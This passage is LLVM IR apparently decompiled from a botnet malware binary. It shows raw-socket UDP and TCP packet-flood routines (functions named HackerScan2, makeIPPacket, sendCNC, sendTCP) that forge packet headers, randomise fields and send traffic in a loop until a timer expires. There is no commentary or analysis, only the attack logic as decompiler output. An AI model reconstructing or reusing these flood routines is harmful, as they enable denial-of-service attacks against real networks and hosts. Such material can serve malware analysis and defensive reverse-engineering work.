  %v8_804e309 = icmp sgt i32 %v2_804e2fe, %v5_804e2b6
  br i1 %v8_804e309, label %dec_label_pc_804e615, label %dec_label_pc_804e2c5

dec_label_pc_804e318:                             ; preds = %dec_label_pc_804e2c5
  %v4_804e318 = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804e2c5

dec_label_pc_804e31d:                             ; preds = %dec_label_pc_804e214
  store i32 %v12_804e1c5, i32* %eax.global-to-local, align 4
  %v4_804e32b = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804e32b, i32* %eax.global-to-local, align 4
  %v4_804e336 = icmp eq i32 %v4_804e32b, 0
  %v1_804e33a = icmp eq i1 %v4_804e336, false
  br i1 %v1_804e33a, label %dec_label_pc_804e357, label %dec_label_pc_804e33c

dec_label_pc_804e33c:                             ; preds = %dec_label_pc_804e31d
  %v0_804e33c = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804e33c, i32* %eax.global-to-local, align 4
  %v3_804e34a = call i32 @HackerPrint(i32 %v0_804e33c, i32 ptrtoint ([27 x i8]* @global_var_805ad90.420 to i32))
  store i32 %v3_804e34a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e612

dec_label_pc_804e357:                             ; preds = %dec_label_pc_804e31d
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804e363 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804e363, i32* %eax.global-to-local, align 4
  store i32 %v4_804e32b, i32* %stack_var_-140, align 4
  %v5_804e36e = call i32 @__GI_setsockopt(i32 %v4_804e32b, i32 0, i32 3, i32 %v2_804e363, i32 4)
  store i32 %v5_804e36e, i32* %eax.global-to-local, align 4
  %v2_804e376 = icmp slt i32 %v5_804e36e, 0
  %v1_804e378 = icmp eq i1 %v2_804e376, false
  br i1 %v1_804e378, label %dec_label_pc_804e3ce.preheader, label %dec_label_pc_804e37a

dec_label_pc_804e3ce.preheader:                   ; preds = %dec_label_pc_804e357
  br label %dec_label_pc_804e39e

dec_label_pc_804e37a:                             ; preds = %dec_label_pc_804e357
  %v0_804e37a = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804e37a, i32* %eax.global-to-local, align 4
  %v3_804e388 = call i32 @HackerPrint(i32 %v0_804e37a, i32 ptrtoint ([33 x i8]* @global_var_805adac.421 to i32))
  store i32 %v3_804e388, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e612

dec_label_pc_804e39e:                             ; preds = %dec_label_pc_804e3ce.preheader, %dec_label_pc_804e39e
  %stack_var_-32.073 = phi i32 [ 50, %dec_label_pc_804e3ce.preheader ], [ %v4_804e3ce, %dec_label_pc_804e39e ]
  %v4_804e3ce = add nsw i32 %stack_var_-32.073, -1
  %v2_804e3a3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e3a3, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3a3, i32* @ebx, align 4
  %v1_804e3ad = call i32 @rand_cmwc(i32 0)
  %v1_804e3b2 = load i32, i32* @ebx, align 4
  %v2_804e3b2 = xor i32 %v1_804e3b2, %v1_804e3ad
  store i32 %v2_804e3b2, i32* @eax, align 4
  %v1_804e3b8 = call i32 @srand(i32 %v2_804e3b2)
  store i32 %v1_804e3b8, i32* @eax, align 4
  %v0_804e3c0 = call i32 @random()
  store i32 %v0_804e3c0, i32* %eax.global-to-local, align 4
  %v1_804e3c6 = call i32 @init_rand(i32 %v0_804e3c0)
  store i32 %v1_804e3c6, i32* %eax.global-to-local, align 4
  %v13_804e3d1 = icmp eq i32 %v4_804e3ce, 0
  %v1_804e3d5 = icmp eq i1 %v13_804e3d1, false
  br i1 %v1_804e3d5, label %dec_label_pc_804e39e, label %dec_label_pc_804e3d7

dec_label_pc_804e3d7:                             ; preds = %dec_label_pc_804e39e
  %v4_804e3d7 = icmp eq i32 %arg4, 0
  %v1_804e3db = icmp eq i1 %v4_804e3d7, false
  br i1 %v1_804e3db, label %dec_label_pc_804e3e6, label %dec_label_pc_804e3fc

dec_label_pc_804e3e6:                             ; preds = %dec_label_pc_804e3d7
  %v5_804e3ed = sub i32 32, %arg4
  %v2_804e3f5 = urem i32 %v5_804e3ed, 32
  %v4_804e3f5 = icmp eq i32 %v2_804e3f5, 0
  br i1 %v4_804e3f5, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804e3e6
  %v5_804e3f5 = shl i32 1, %v2_804e3f5
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804e3e6, %bb
  %v0_804e3f7 = phi i32 [ %v5_804e3f5, %bb ], [ 1, %dec_label_pc_804e3e6 ]
  %v1_804e3f7 = sub i32 0, %v0_804e3f7
  store i32 %v1_804e3f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3fc

dec_label_pc_804e3fc:                             ; preds = %dec_label_pc_804e3d7, %bb72
  %storemerge6 = phi i32 [ %v1_804e3f7, %bb72 ], [ 0, %dec_label_pc_804e3d7 ]
  %v1_804e3ff = add i32 %arg5, 28
  %v1_804e40b = add i32 %arg5, 58
  %v2_804e40e = and i32 %v1_804e40b, -16
  %v2_804e414 = sub i32 %v12_804e1c5, %v2_804e40e
  %v1_804e41c = add i32 %v2_804e414, 15
  %v2_804e41f = and i32 %v1_804e41c, -16
  %v1_804e437 = add i32 %v2_804e41f, 20
  %v5_804e43a = inttoptr i32 %v1_804e437 to i16*
  %v1_804e440 = add i32 %arg5, 8
  store i32 %v1_804e440, i32* @eax, align 4
  store i32 %v1_804e440, i32* @ebx, align 4
  %v5_804e448 = add i32 %v2_804e414, -16
  %v6_804e448 = inttoptr i32 %v5_804e448 to i32*
  store i32 %storemerge6, i32* %v6_804e448, align 4
  %v1_804e44b = call i32 @HackerScan2(i32 %v1_804e3ff)
  store i32 %v1_804e44b, i32* %eax.global-to-local, align 4
  %v0_804e450 = load i32, i32* @esp, align 4
  %v3_804e456 = inttoptr i32 %v0_804e450 to i32*
  store i32 %v1_804e44b, i32* %v3_804e456, align 4
  %v0_804e457 = call i32 @htonl()
  store i32 %v0_804e457, i32* %eax.global-to-local, align 4
  %v0_804e45c = load i32, i32* @esp, align 4
  %v3_804e45f = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804e45f, i32* %edx.global-to-local, align 4
  %v0_804e465 = load i32, i32* @ebx, align 4
  %v2_804e465 = add i32 %v0_804e45c, 8
  %v3_804e465 = inttoptr i32 %v2_804e465 to i32*
  store i32 %v0_804e465, i32* %v3_804e465, align 4
  %v1_804e466 = add i32 %v0_804e45c, 4
  %v2_804e466 = inttoptr i32 %v1_804e466 to i32*
  store i32 17, i32* %v2_804e466, align 4
  %v3_804e468 = inttoptr i32 %v0_804e45c to i32*
  store i32 %v0_804e457, i32* %v3_804e468, align 4
  %v0_804e469 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e469 = add i32 %v0_804e45c, -4
  %v3_804e469 = inttoptr i32 %v2_804e469 to i32*
  store i32 %v0_804e469, i32* %v3_804e469, align 4
  %v5_804e46a = add i32 %v0_804e45c, -8
  %v6_804e46a = inttoptr i32 %v5_804e46a to i32*
  store i32 %v2_804e41f, i32* %v6_804e46a, align 4
  %v0_804e46d = call i32 @makeIPPacket()
  %v0_804e472 = load i32, i32* @esp, align 4
  %v1_804e47b = urem i32 %v1_804e440, 65536
  store i32 %v1_804e47b, i32* %eax.global-to-local, align 4
  %v2_804e483 = add i32 %v0_804e472, 8
  %v3_804e483 = inttoptr i32 %v2_804e483 to i32*
  store i32 %v1_804e47b, i32* %v3_804e483, align 4
  %v2_804e484 = call i32 @htons(i32 %v1_804e437)
  %v3_804e484 = trunc i32 %v2_804e484 to i16
  %sext7 = mul i32 %v2_804e484, 65536
  %v1_804e48c = sdiv i32 %sext7, 65536
  store i32 %v1_804e48c, i32* %edx.global-to-local, align 4
  store i32 %v1_804e437, i32* %eax.global-to-local, align 4
  %v3_804e491 = add i32 %v2_804e41f, 24
  %v4_804e491 = inttoptr i32 %v3_804e491 to i16*
  store i16 %v3_804e484, i16* %v4_804e491, align 8
  %v2_804e495 = call i32 @rand_cmwc(i32 %v1_804e437)
  %sext = mul i32 %v2_804e495, 65536
  %v1_804e49a = sdiv i32 %sext, 65536
  store i32 %v1_804e49a, i32* %edx.global-to-local, align 4
  store i32 %v1_804e437, i32* %eax.global-to-local, align 4
  %v1_804e49f = trunc i32 %v1_804e49a to i16
  store i16 %v1_804e49f, i16* %v5_804e43a, align 4
  br i1 %v1_804e1d2, label %dec_label_pc_804e4b3, label %dec_label_pc_804e4a8

dec_label_pc_804e4a8:                             ; preds = %dec_label_pc_804e3fc
  %v2_804e4a8 = call i32 @rand_cmwc(i32 %v1_804e437)
  store i32 %v2_804e4a8, i32* %eax.global-to-local, align 4
  %.pre29 = urem i32 %arg2, 65536
  br label %dec_label_pc_804e4cb

dec_label_pc_804e4b3:                             ; preds = %dec_label_pc_804e3fc
  %v1_804e4b6 = urem i32 %arg2, 65536
  store i32 %v1_804e4b6, i32* %eax.global-to-local, align 4
  %v0_804e4bb = load i32, i32* @esp, align 4
  %v2_804e4be = add i32 %v0_804e4bb, -16
  %v3_804e4be = inttoptr i32 %v2_804e4be to i32*
  store i32 %v1_804e4b6, i32* %v3_804e4be, align 4
  %v1_804e4bf = sext i16 %tmp32 to i32
  %v2_804e4bf = call i32 @htons(i32 %v1_804e4bf)
  store i32 %v2_804e4bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e4cb

dec_label_pc_804e4cb:                             ; preds = %dec_label_pc_804e4a8, %dec_label_pc_804e4b3
  %v1_804e56f.pre-phi = phi i32 [ %.pre29, %dec_label_pc_804e4a8 ], [ %v1_804e4b6, %dec_label_pc_804e4b3 ]
  %storemerge5.in = phi i32 [ %v2_804e4a8, %dec_label_pc_804e4a8 ], [ %v2_804e4bf, %dec_label_pc_804e4b3 ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804e4ce = sdiv i32 %sext8, 65536
  store i32 %v4_804e4ce, i32* %edx.global-to-local, align 4
  %v3_804e4d1 = add i32 %v2_804e41f, 22
  %v4_804e4d1 = inttoptr i32 %v3_804e4d1 to i16*
  store i16 %storemerge5, i16* %v4_804e4d1, align 2
  %v1_804e4d8 = add i32 %v2_804e41f, 26
  %v2_804e4d8 = inttoptr i32 %v1_804e4d8 to i16*
  store i16 0, i16* %v2_804e4d8, align 2
  %v1_804e4e1 = add i32 %v2_804e41f, 28
  store i32 %v1_804e4e1, i32* %eax.global-to-local, align 4
  %v4_804e4e4 = load i32, i32* @esp, align 4
  %v5_804e4e4 = add i32 %v4_804e4e4, -4
  %v6_804e4e4 = inttoptr i32 %v5_804e4e4 to i32*
  store i32 %arg5, i32* %v6_804e4e4, align 4
  %v0_804e4e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4e7 = add i32 %v4_804e4e4, -8
  %v3_804e4e7 = inttoptr i32 %v2_804e4e7 to i32*
  store i32 %v0_804e4e7, i32* %v3_804e4e7, align 4
  %v3_804e4e8 = inttoptr i32 %v4_804e4ce to i8*
  %v4_804e4e8 = call i32 @makeRandomStr(i8* %v3_804e4e8, i32 %v12_804e1c5)
  %v0_804e4ed = load i32, i32* @esp, align 4
  store i32 %v2_804e41f, i32* %eax.global-to-local, align 4
  %v1_804e4f3 = or i32 %v2_804e41f, 2
  %v2_804e4f3 = inttoptr i32 %v1_804e4f3 to i16*
  %v3_804e4f3 = load i16, i16* %v2_804e4f3, align 2
  %v4_804e4f3 = zext i16 %v3_804e4f3 to i32
  store i32 %v4_804e4f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804e41f, i32* %eax.global-to-local, align 4
  %v2_804e502 = add i32 %v0_804e4ed, 4
  %v3_804e502 = inttoptr i32 %v2_804e502 to i32*
  store i32 %v4_804e4f3, i32* %v3_804e502, align 4
  %v0_804e503 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e503 = inttoptr i32 %v0_804e4ed to i32*
  store i32 %v0_804e503, i32* %v3_804e503, align 4
  %v3_804e504 = inttoptr i32 %v4_804e4ce to i16*
  %v4_804e504 = call i32 @csum(i16* %v3_804e504, i32 %v12_804e1c5)
  %v5_804e504 = trunc i32 %v4_804e504 to i16
  %sext11 = mul i32 %v4_804e504, 65536
  %v1_804e50c = sdiv i32 %sext11, 65536
  store i32 %v1_804e50c, i32* %edx.global-to-local, align 4
  store i32 %v2_804e41f, i32* %eax.global-to-local, align 4
  %v3_804e511 = or i32 %v2_804e41f, 10
  %v4_804e511 = inttoptr i32 %v3_804e511 to i16*
  store i16 %v5_804e504, i16* %v4_804e511, align 2
  %v0_804e515 = load i32, i32* @esp, align 4
  %v1_804e518 = add i32 %v0_804e515, -16
  %v2_804e518 = inttoptr i32 %v1_804e518 to i32*
  store i32 0, i32* %v2_804e518, align 4
  %v2_804e51a = inttoptr i32 %v4_804e4ce to i32*
  %v3_804e51a = call i32 @__GI_time(i32* %v2_804e51a)
  %v0_804e51f = load i32, i32* @esp, align 4
  %v1_804e51f = add i32 %v0_804e51f, 16
  %v5_804e522 = add i32 %v3_804e51a, %arg3
  store i32 %v5_804e522, i32* %eax.global-to-local, align 4
  %v3_804e599 = or i32 %v2_804e41f, 4
  %v4_804e599 = inttoptr i32 %v3_804e599 to i16*
  %v2_804e5bc = or i32 %v2_804e41f, 12
  %v3_804e5bc = inttoptr i32 %v2_804e5bc to i32*
  br label %dec_label_pc_804e531

dec_label_pc_804e531:                             ; preds = %dec_label_pc_804e5ec, %dec_label_pc_804e60a, %dec_label_pc_804e4cb
  %v0_804e537 = phi i32 [ %v1_804e51f, %dec_label_pc_804e4cb ], [ %v0_804e537.pre.pre, %dec_label_pc_804e60a ], [ %v1_804e5f6, %dec_label_pc_804e5ec ]
  %stack_var_-94.0 = phi i16 [ %tmp, %dec_label_pc_804e4cb ], [ %storemerge, %dec_label_pc_804e60a ], [ %storemerge, %dec_label_pc_804e5ec ]
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804e4cb ], [ %v4_804e60a, %dec_label_pc_804e60a ], [ 0, %dec_label_pc_804e5ec ]
  store i32 %v2_804e1fa, i32* %eax.global-to-local, align 4
  store i32 %v2_804e41f, i32* %edx.global-to-local, align 4
  %v1_804e53a = add i32 %v0_804e537, -12
  %v2_804e53a = inttoptr i32 %v1_804e53a to i32*
  store i32 16, i32* %v2_804e53a, align 4
  %v2_804e53c = add i32 %v0_804e537, -16
  %v3_804e53c = inttoptr i32 %v2_804e53c to i32*
  store i32 %v2_804e1fa, i32* %v3_804e53c, align 4
  %v1_804e53d = add i32 %v0_804e537, -20
  %v2_804e53d = inttoptr i32 %v1_804e53d to i32*
  store i32 0, i32* %v2_804e53d, align 4
  %v5_804e53f = add i32 %v0_804e537, -24
  %v6_804e53f = inttoptr i32 %v5_804e53f to i32*
  store i32 %v1_804e3ff, i32* %v6_804e53f, align 4
  %v0_804e542 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e542 = add i32 %v0_804e537, -28
  %v3_804e542 = inttoptr i32 %v2_804e542 to i32*
  store i32 %v0_804e542, i32* %v3_804e542, align 4
  %v5_804e543 = add i32 %v0_804e537, -32
  %v6_804e543 = inttoptr i32 %v5_804e543 to i32*
  store i32 %v4_804e32b, i32* %v6_804e543, align 4
  %v6_804e546 = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e546, i32* %eax.global-to-local, align 4
  %v1_804e54e = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %sext3 = mul i32 %v1_804e54e, 65536
  %v1_804e553 = sdiv i32 %sext3, 65536
  store i32 %v1_804e553, i32* %edx.global-to-local, align 4
  store i32 %v1_804e437, i32* %eax.global-to-local, align 4
  %v1_804e558 = trunc i32 %v1_804e553 to i16
  store i16 %v1_804e558, i16* %v5_804e43a, align 4
  br i1 %v1_804e1d2, label %dec_label_pc_804e56c, label %dec_label_pc_804e561

dec_label_pc_804e561:                             ; preds = %dec_label_pc_804e531
  %v1_804e561 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804e584

dec_label_pc_804e56c:                             ; preds = %dec_label_pc_804e531
  store i32 %v1_804e56f.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804e574 = load i32, i32* @esp, align 4
  %v2_804e577 = add i32 %v0_804e574, -16
  %v3_804e577 = inttoptr i32 %v2_804e577 to i32*
  store i32 %v1_804e56f.pre-phi, i32* %v3_804e577, align 4
  %v1_804e578 = sext i16 %stack_var_-94.0 to i32
  %v2_804e578 = call i32 @htons(i32 %v1_804e578)
  br label %dec_label_pc_804e584

dec_label_pc_804e584:                             ; preds = %dec_label_pc_804e561, %dec_label_pc_804e56c
  %storemerge.in = phi i32 [ %v1_804e561, %dec_label_pc_804e561 ], [ %v2_804e578, %dec_label_pc_804e56c ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e437, i32* %eax.global-to-local, align 4
  %v4_804e587 = urem i32 %storemerge.in, 65536
  %v5_804e587 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e587 = and i32 %v5_804e587, -65536
  %v7_804e587 = or i32 %v6_804e587, %v4_804e587
  store i32 %v7_804e587, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804e4d1, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804e58f = sdiv i32 %sext13, 65536
  %v2_804e58f = call i32 @rand_cmwc(i32 %v1_804e58f)
  %sext4 = mul i32 %v2_804e58f, 65536
  %v1_804e594 = sdiv i32 %sext4, 65536
  store i32 %v1_804e594, i32* %edx.global-to-local, align 4
  store i32 %v2_804e41f, i32* @eax, align 4
  %v1_804e599 = trunc i32 %v1_804e594 to i16
  store i16 %v1_804e599, i16* %v4_804e599, align 4
  %v0_804e59d = load i32, i32* @esp, align 4
  %v5_804e5a0 = add i32 %v0_804e59d, -16
  %v6_804e5a0 = inttoptr i32 %v5_804e5a0 to i32*
  store i32 %storemerge6, i32* %v6_804e5a0, align 4
  %v2_804e5a3 = call i32 @HackerScan2(i32 %v1_804e58f)
  store i32 %v2_804e5a3, i32* %eax.global-to-local, align 4
  %v0_804e5a8 = load i32, i32* @esp, align 4
  %v3_804e5ae = inttoptr i32 %v0_804e5a8 to i32*
  store i32 %v2_804e5a3, i32* %v3_804e5ae, align 4
  %v0_804e5af = call i32 @htonl()
  store i32 %v0_804e5af, i32* %edx.global-to-local, align 4
  store i32 %v0_804e5af, i32* %v3_804e5bc, align 4
  store i32 %v2_804e41f, i32* %eax.global-to-local, align 4
  %v3_804e5c2 = load i16, i16* %v2_804e4f3, align 2
  %v4_804e5c2 = zext i16 %v3_804e5c2 to i32
  store i32 %v4_804e5c2, i32* %edx.global-to-local, align 4
  store i32 %v2_804e41f, i32* %eax.global-to-local, align 4
  %v1_804e5d1 = load i32, i32* @esp, align 4
  %v2_804e5d1 = add i32 %v1_804e5d1, -4
  %v3_804e5d1 = inttoptr i32 %v2_804e5d1 to i32*
  store i32 %v4_804e5c2, i32* %v3_804e5d1, align 4
  %v0_804e5d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5d2 = add i32 %v1_804e5d1, -8
  %v3_804e5d2 = inttoptr i32 %v2_804e5d2 to i32*
  store i32 %v0_804e5d2, i32* %v3_804e5d2, align 4
  %v3_804e5d3 = inttoptr i32 %v1_804e58f to i16*
  %v4_804e5d3 = call i32 @csum(i16* %v3_804e5d3, i32 ptrtoint (i32* @0 to i32))
  %v5_804e5d3 = trunc i32 %v4_804e5d3 to i16
  %sext16 = mul i32 %v4_804e5d3, 65536
  %v1_804e5db = sdiv i32 %sext16, 65536
  store i32 %v1_804e5db, i32* %edx.global-to-local, align 4
  store i16 %v5_804e5d3, i16* %v4_804e511, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804e5e7 = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804e5ea = icmp eq i1 %v15_804e5e7, false
  br i1 %v1_804e5ea, label %dec_label_pc_804e60a, label %dec_label_pc_804e5ec

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e584
  %v0_804e5ec = load i32, i32* @esp, align 4
  %v1_804e5ef = add i32 %v0_804e5ec, -16
  %v2_804e5ef = inttoptr i32 %v1_804e5ef to i32*
  store i32 0, i32* %v2_804e5ef, align 4
  %v2_804e5f1 = inttoptr i32 %v1_804e58f to i32*
  %v3_804e5f1 = call i32 @__GI_time(i32* %v2_804e5f1)
  store i32 %v3_804e5f1, i32* %eax.global-to-local, align 4
  %v0_804e5f6 = load i32, i32* @esp, align 4
  %v1_804e5f6 = add i32 %v0_804e5f6, 16
  %v8_804e5fc = icmp sgt i32 %v3_804e5f1, %v5_804e522
  br i1 %v8_804e5fc, label %dec_label_pc_804e612, label %dec_label_pc_804e531

dec_label_pc_804e60a:                             ; preds = %dec_label_pc_804e584
  %v4_804e60a = add i32 %stack_var_-80.0, 1
  %v0_804e537.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e531

dec_label_pc_804e612:                             ; preds = %dec_label_pc_804e5ec, %dec_label_pc_804e37a, %dec_label_pc_804e33c
  %v0_804e61b27 = phi i32 [ %v3_804e388, %dec_label_pc_804e37a ], [ %v3_804e34a, %dec_label_pc_804e33c ], [ %v3_804e5f1, %dec_label_pc_804e5ec ]
  br label %dec_label_pc_804e615

dec_label_pc_804e615:                             ; preds = %dec_label_pc_804e2f9, %dec_label_pc_804e26c, %dec_label_pc_804e1f7, %dec_label_pc_804e251, %dec_label_pc_804e612
  %v0_804e61b = phi i32 [ 0, %dec_label_pc_804e26c ], [ %v4_804e204, %dec_label_pc_804e1f7 ], [ %v3_804e25f, %dec_label_pc_804e251 ], [ %v0_804e61b27, %dec_label_pc_804e612 ], [ %v2_804e2fe, %dec_label_pc_804e2f9 ]
  store i32 %v0_804e1c4, i32* @ebx, align 4
  ret i32 %v0_804e61b

; uselistorder directives
  uselistorder i32 %v0_804e5af, { 1, 0 }
  uselistorder i32 %v1_804e594, { 1, 0 }
  uselistorder i32 %v1_804e58f, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804e553, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804e537, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e4ed, { 1, 0 }
  uselistorder i32 %v4_804e4ce, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804e56f.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e4b6, { 2, 1, 0 }
  uselistorder i32 %v1_804e49a, { 1, 0 }
  uselistorder i32 %v1_804e47b, { 1, 0 }
  uselistorder i32 %v2_804e41f, { 8, 7, 6, 5, 16, 15, 14, 4, 3, 13, 2, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v2_804e3f5, { 1, 0 }
  uselistorder i32 %v4_804e32b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %v1_804e274, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804e26f, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804e240, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e1fa, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804e1e2, { 1, 0 }
  uselistorder i32 %v12_804e1c5, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e615, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804e584, { 1, 0 }
  uselistorder label %dec_label_pc_804e531, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e4cb, { 1, 0 }
  uselistorder label %dec_label_pc_804e3fc, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804e39e, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f9, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e1f7, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_804e627 = call i32 @__GI_time(i32* null)
  %v5_804e62f = add i32 %v2_804e627, %arg3
  %v1_804e63c = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e650 = urem i32 %arg2, 65536
  %v1_804e659 = call i32 @htons(i32 %v1_804e650)
  %v2_804e67b = ptrtoint i32* %stack_var_-28 to i32
  %v2_804e6af19 = call i32 @__GI_time(i32* null)
  %v5_804e6ba22 = icmp slt i32 %v2_804e6af19, %v5_804e62f
  br i1 %v5_804e6ba22, label %dec_label_pc_804e667, label %dec_label_pc_804e6bc

dec_label_pc_804e667:                             ; preds = %entry, %dec_label_pc_804e667
  %v3_804e670 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804e687 = call i32 @__libc_connect(i32 %v3_804e670, i32 %v2_804e67b, i32 16)
  %v1_804e694 = call i32 @sleep(i32 1)
  %v1_804e6a2 = call i32 @__libc_close(i32 %v3_804e670)
  %v2_804e6af = call i32 @__GI_time(i32* null)
  %v5_804e6ba = icmp slt i32 %v2_804e6af, %v5_804e62f
  br i1 %v5_804e6ba, label %dec_label_pc_804e667, label %dec_label_pc_804e6bc

dec_label_pc_804e6bc:                             ; preds = %dec_label_pc_804e667, %entry
  %v2_804e6af.lcssa = phi i32 [ %v2_804e6af19, %entry ], [ %v2_804e6af, %dec_label_pc_804e667 ]
  ret i32 %v2_804e6af.lcssa

; uselistorder directives
  uselistorder i32 %v5_804e62f, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804e667, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i16 @__decompiler_undefined_function_4()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804e6c2 = load i32, i32* @esi, align 4
  %v0_804e6c3 = load i32, i32* @ebx, align 4
  %v15_804e6c4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e6db = icmp eq i32 %arg2, 0
  %v1_804e6df = icmp eq i1 %v4_804e6db, false
  br i1 %v1_804e6df, label %dec_label_pc_804e6ec, label %dec_label_pc_804e6e1

dec_label_pc_804e6e1:                             ; preds = %entry
  %v1_804e6e1 = call i32 @rand_cmwc(i32 %v15_804e6c4)
  store i32 %v1_804e6e1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e704

dec_label_pc_804e6ec:                             ; preds = %entry
  %v1_804e6ef = urem i32 %arg2, 65536
  store i32 %v1_804e6ef, i32* %eax.global-to-local, align 4
  %v5_804e6f4 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e6f4, i1* %cf.global-to-local, align 1
  %v1_804e6f8 = call i32 @htons(i32 %v1_804e6ef)
  store i32 %v1_804e6f8, i32* %eax.global-to-local, align 4
  %v0_804e6fd = load i32, i32* @esp, align 4
  %v2_804e6fd = icmp ugt i32 %v0_804e6fd, -17
  store i1 %v2_804e6fd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e704

dec_label_pc_804e704:                             ; preds = %dec_label_pc_804e6e1, %dec_label_pc_804e6ec
  %v2_804e707 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e70a = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804e70a, i1* %cf.global-to-local, align 1
  %v15_804e70a = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804e70a, i32* %eax.global-to-local, align 4
  %v4_804e711 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804e711, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e719 = icmp eq i32 %v4_804e711, 0
  br i1 %v1_804e719, label %dec_label_pc_804e722, label %dec_label_pc_804ec45

dec_label_pc_804e722:                             ; preds = %dec_label_pc_804e704
  %v15_804e725 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804e725, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
